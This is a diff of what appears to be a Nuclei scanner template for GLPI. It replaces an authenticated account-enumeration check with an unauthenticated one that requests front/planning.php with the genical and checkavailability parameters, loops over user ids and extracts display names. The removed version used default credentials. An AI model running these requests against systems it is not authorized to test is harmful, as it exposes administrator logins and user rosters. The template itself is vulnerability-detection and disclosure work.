@@ -1,36 +1,37 @@
-id: glpi-planning-user-enumeration
+id: glpi-planning-unauth-user-enumeration
 
 info:
-  name: GLPI Planning - Missing Authorization to Account Enumeration
+  name: GLPI Planning - Unauthenticated Username Enumeration
   author: wong-hau-pepelu
   severity: medium
   description: |
-    The GLPI planning feature dispatches front/planning.form.php without any
-    authorization check. Planning::sendAddUserForm() binds an attacker-supplied
-    users_id to the caller's planning filter after only validating users_id > 0,
-    so a low-privileged account whose planning right is READMY ("own planning
-    only") can bind any other user. Rendering the filter list afterwards
-    (ajax/planning.php?action=get_filters_form) discloses the bound user's
-    display name and CalDAV login, turning the missing check into a full account
-    enumeration and valid-id oracle.
+    GLPI exposes the planning "check availability" view through
+    front/planning.php without any authentication check. The right check in
+    front/planning.php is skipped whenever the genical parameter is present
+    (it is meant to let the iCal/WebCal export authenticate with its own
+    token further down the file), but the checkavailability branch is reached
+    before that token logic. An anonymous attacker can therefore call
+    Planning::checkAvailability() directly with itemtype=User and a users_id,
+    and the rendered availability page discloses that account's display name.
+    Walking users_id turns this into a full username enumeration and a
+    valid-id oracle, with no credentials.
   impact: |
-    Any authenticated user without the planning READALL right can enumerate every
-    account's display name and login on the instance, including the super-admin
-    (user id 2 on a default install). This exposes the administrator login name
-    and the complete user roster to a user who is authorized to see only their own
-    planning.
+    An unauthenticated, remote attacker can enumerate the display names of
+    GLPI accounts, including the built-in super-administrator (user id 2 on a
+    default install). This exposes the administrator login name and the user
+    roster to anyone who can reach the web interface.
   remediation: |
-    Upgrade to a GLPI release that adds a right check to the planning form
-    dispatcher (GHSA-5fw5-vgrw-ggp5 / GHSA-j5vx-jrmw-2498). As an interim measure,
-    restrict access to the planning feature to trusted profiles.
+    Upgrade to GLPI 11.0.10 / 10.0.28 or later, which requires the planning
+    READ right for the checkavailability branch even when genical is present
+    (GHSA-j5vx-jrmw-2498, commit ddc88ad6).
   reference:
-    - https://github.com/advisories/GHSA-5fw5-vgrw-ggp5
     - https://github.com/advisories/GHSA-j5vx-jrmw-2498
+    - https://github.com/glpi-project/glpi/commit/ddc88ad6e0
     - https://github.com/glpi-project/glpi
   classification:
-    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N
-    cvss-score: 4.3
-    cwe-id: CWE-862
+    cvss-metrics: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N
+    cvss-score: 5.3
+    cwe-id: CWE-862,CWE-306
   metadata:
     verified: false
     max-request: 5
@@ -38,95 +39,43 @@ info:
     product: glpi
     shodan-query: http.title:"Authentication - GLPI"
     fofa-query: app="GLPI"
-  tags: glpi,planning,authz,idor,enum,missing-authorization
-
-variables:
-  # Any account whose planning right is NOT READALL demonstrates the flaw.
-  # The default low-privilege Observer account on a fresh GLPI install is normal/normal.
-  username: "normal"
-  password: "normal"
-  # User id to bind and disclose. 2 is the built-in super-admin "glpi" on a default install.
-  victim_id: "2"
+  tags: glpi,planning,enum,unauth,missing-authorization
 
 http:
-  - raw:
-      # 1) fetch the login page and its single-use CSRF token
-      - |
-        GET / HTTP/1.1
-        Host: {{Hostname}}
-        Accept: text/html
+  - method: GET
+    path:
+      # genical skips the right check; the checkavailability branch runs anonymously
+      # and renders Planning::checkAvailability() for itemtype=User / users_id.
+      - "{{BaseURL}}/front/planning.php?genical=1&checkavailability=1&itemtype=User&users_id={{uid}}&begin=2000-01-01&end=2000-01-02"
 
-      # 2) authenticate as the low-privilege account
-      - |
-        POST /front/login.php HTTP/1.1
-        Host: {{Hostname}}
-        Content-Type: application/x-www-form-urlencoded
+    payloads:
+      # default built-in account ids: 2=glpi(super-admin) 3=post-only 4=tech 5=normal
+      uid:
+        - "2"
+        - "3"
+        - "4"
+        - "5"
+        - "6"
+    attack: batteringram
+    stop-at-first-match: false
 
-        login_name={{username}}&login_password={{password}}&_glpi_csrf_token={{login_csrf}}&redirect=
-
-      # 3) open the planning page: initialises the planning session and yields a
-      #    fresh single-use CSRF token for the next POST
-      - |
-        GET /front/planning.php HTTP/1.1
-        Host: {{Hostname}}
-        Accept: text/html
-
-      # 4) the missing-authz call: bind a foreign user to our planning filter.
-      #    No right check is performed; only users_id > 0 is validated.
-      - |
-        POST /front/planning.form.php HTTP/1.1
-        Host: {{Hostname}}
-        Content-Type: application/x-www-form-urlencoded
-
-        action=send_add_user_form&users_id={{victim_id}}&_glpi_csrf_token={{bind_csrf}}
-
-      # 5) render the filter list; the bound foreign user's name/login leak here
-      - |
-        GET /ajax/planning.php?action=get_filters_form HTTP/1.1
-        Host: {{Hostname}}
-        Accept: text/html
-
-    req-condition: true
     matchers-condition: and
     matchers:
-      # genuine planning-filter response, i.e. the login actually succeeded
-      - type: dsl
-        dsl:
-          - 'status_code_5 == 200'
-          - 'contains(body_5, "id=\"planning_filter\"")'
+      - type: status
+        status:
+          - 200
 
-      # the foreign victim is now present in a READMY user's own filter list:
-      # this is the authorization bypass itself
-      - type: dsl
-        dsl:
-          - 'contains(body_5, "event_name=\"user_{{victim_id}}\"")'
-
-      # the bound id resolved to a real account (CalDAV login is emitted only for
-      # resolvable users), proving the account was disclosed, not a blank "N/A"
-      - type: dsl
-        dsl:
-          - 'contains(body_5, "\\/calendar")'
+      # the availability page is only rendered for a resolvable account; the
+      # per-user header cell carries the disclosed display name. A non-existent
+      # id returns early (no availability form, no name cell).
+      - type: regex
+        part: body
+        regex:
+          - '<th class="fs-4"[^>]*>[^<]+</th>'
 
     extractors:
       - type: regex
-        name: login_csrf
-        internal: true
-        part: body_1
+        part: body
         group: 1
         regex:
-          - 'name="_glpi_csrf_token"[^>]*value="([^"]+)"'
-
-      - type: regex
-        name: bind_csrf
-        internal: true
-        part: body_3
-        group: 1
-        regex:
-          - 'name="_glpi_csrf_token"[^>]*value="([^"]+)"'
-
-      # the disclosed login name(s) of the bound account(s)
-      - type: regex
-        part: body_5
-        group: 1
-        regex:
-          - 'users\\/([A-Za-z0-9_.\-]+)\\/calendar'
+          - '<th class="fs-4"[^>]*>([^<]+)</th>'
